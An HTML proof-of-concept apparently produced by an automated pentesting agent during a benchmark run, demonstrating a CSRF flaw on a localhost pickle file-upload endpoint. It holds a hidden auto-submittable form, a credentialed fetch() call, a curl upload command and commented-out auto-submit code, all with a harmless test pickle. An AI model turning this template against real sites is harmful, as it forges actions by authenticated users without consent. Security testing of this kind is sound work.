<!-- 
POC: HTML POC demonstrating CSRF vulnerability on file upload endpoint - shows how an attacker can trick authenticated users into uploading files without their knowledge
Target: ./repo
Created: 2025-11-10T15:08:36.463Z
Session: benchmark-XBEN-036-24-mht9l3st

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-036-24-mht9l3st/pocs/poc_csrf_file_upload.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>CSRF Vulnerability PoC - File Upload</h1>
    <p>This page demonstrates a Cross-Site Request Forgery (CSRF) attack against the file upload endpoint.</p>
    <p>When an authenticated user visits this page, the form below will automatically submit to upload a file to the target application.</p>
    
    <h2>Attack Vector:</h2>
    <p>An attacker hosts this HTML on their server. When an authenticated user of the target application visits this page, 
    the following form automatically submits to http://localhost:8080/, uploading a malicious file without the user's knowledge or consent.</p>
    
    <h2>Why This Works:</h2>
    <ul>
        <li>No CSRF token is required by the upload endpoint</li>
        <li>No SameSite cookie restrictions are in place</li>
        <li>The form can be auto-submitted from any domain</li>
        <li>The user's authentication cookies are automatically sent with cross-origin requests</li>
    </ul>
    
    <!-- Hidden form that auto-submits for CSRF attack -->
    <form id="csrf-form" action="http://localhost:8080/" method="POST" enctype="multipart/form-data" style="display:none;">
        <!-- Malicious pickle file content (base64 encoded) -->
        <!-- This would be a real pickle payload in a real attack -->
        <input type="hidden" id="pickle-input" name="pickle_file" value="">
    </form>
    
    <h2>Manual Test:</h2>
    <p>To demonstrate the vulnerability, run this bash command:</p>
    <pre><code>
# Step 1: Create a test pickle file (harmless for PoC)
python3 -c "
import pickle
import subprocess

# Create a simple pickle object (for demonstration - harmless)
data = {'test': 'data'}
with open('/tmp/test.pickle', 'wb') as f:
    pickle.dump(data, f)
"

# Step 2: Submit the form without CSRF token
curl -X POST \
  -F "pickle_file=@/tmp/test.pickle" \
  http://localhost:8080/

# The request succeeds because there's no CSRF token validation
# If this was a malicious pickle with RCE payload, the server would execute it
    </code></pre>
    
    <h2>Automated CSRF Form Submission:</h2>
    <p>Click the button below to trigger the CSRF attack (for testing purposes):</p>
    <button onclick="submitCSRFForm()">Submit CSRF Form</button>
    
    <p id="status"></p>
    
    <script>
    // Function to submit the CSRF form
    function submitCSRFForm() {
        // In a real attack, this would create a malicious pickle payload
        // For PoC purposes, we'll create a harmless one
        
        // Create a simple pickle object
        fetch('http://localhost:8080/', {
            method: 'POST',
            body: new FormData(document.getElementById('csrf-form')),
            credentials: 'include'  // Include cookies (CSRF point!)
        })
        .then(response => {
            document.getElementById('status').innerHTML = 'Form submitted. Response status: ' + response.status;
            return response.text();
        })
        .then(text => {
            document.getElementById('status').innerHTML += '<br>Response: ' + text.substring(0, 100);
        })
        .catch(error => {
            document.getElementById('status').innerHTML = 'Error: ' + error.message + ' (CORS or connection issue expected)';
        });
    }
    
    // Uncomment to auto-submit on page load (like in real CSRF attacks)
    // window.onload = function() { submitCSRFForm(); };
    </script>
    
    <h2>Vulnerability Details:</h2>
    <ul>
        <li><strong>Affected Endpoint:</strong> POST / (root endpoint)</li>
        <li><strong>Parameter:</strong> pickle_file (multipart/form-data)</li>
        <li><strong>Missing Protection:</strong> CSRF token, SameSite cookies, Origin validation</li>
        <li><strong>Attack Prerequisites:</strong> User must be authenticated to the target application</li>
        <li><strong>Combined Risk:</strong> When combined with pickle deserialization RCE, enables complete server compromise</li>
    </ul>
</body>
</html>